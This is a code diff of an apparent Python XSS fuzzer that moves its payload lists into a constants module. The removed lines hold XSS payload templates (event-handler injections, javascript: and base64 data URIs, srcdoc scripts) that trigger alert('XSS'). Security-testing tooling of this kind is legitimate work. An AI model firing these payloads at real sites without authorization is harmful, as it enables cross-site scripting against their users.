@@ -2,37 +2,7 @@ import asyncio
 import aiohttp
 from urllib.parse import urlparse, parse_qs, urlencode
 from itertools import product
-
-# Import base64 for base64 encoding
-import base64
-
-# Payload components for dynamic generation
-TAGS = ["script", "img", "div", "input"]
-EVENTS = ["onerror", "onload", "onclick", "onmouseover", "onfocus"]
-ATTRIBUTES = ["src", "href", "action"]
-ENCODINGS = {
-    "hex": lambda s: s.encode("utf-8").hex(),
-    "entity": lambda s: s.replace("<", "<").replace(">", ">").replace("'", "&#39;"),
-    "normal": lambda s: s
-}
-
-# Base payload templates using placeholders ({} instead of f-strings)
-PAYLOAD_TEMPLATES = [
-    "<{tag} {event}='alert(`XSS`)' {attr}='x'>",
-    "<{tag} {event}='javascript:alert(`XSS`)' {attr}='x'>",
-    "<{tag} {attr}='x' {event}='alert(`XSS`)'/>",
-    "<{tag} {attr}='x' {event}='javascript:alert(`XSS`)'/>",
-    "<{tag} {event}='alert(`XSS`)'/>",
-    "<{tag} {event}='javascript:alert(`XSS`)'/>",
-    "<{tag} {attr}='x' {event}='alert(`XSS`)'/>",
-    "<{tag} {event}='alert(`XSS`)' {attr}='x'/>",
-    "<{tag} {event}='alert(`XSS`)' style=expression(alert(`XSS`))>",
-    "<{tag} srcdoc='<script>alert(`XSS`)</script>'>",
-    # Use precomputed base64 string for the script content
-    "<{tag} {event}='alert(`XSS`)' {attr}='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
-    "<{tag} {event}='alert(`XSS`)' {attr}='javascript:alert(`XSS`)'/>",
-    "<{tag} {event}='alert(`XSS`)' {attr}='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>"
-]
+from utils.constants import TAGS,EVENTS,ATTRIBUTES,ENCODINGS,PAYLOAD_TEMPLATES
 
 def generate_payloads():
     payloads = set()
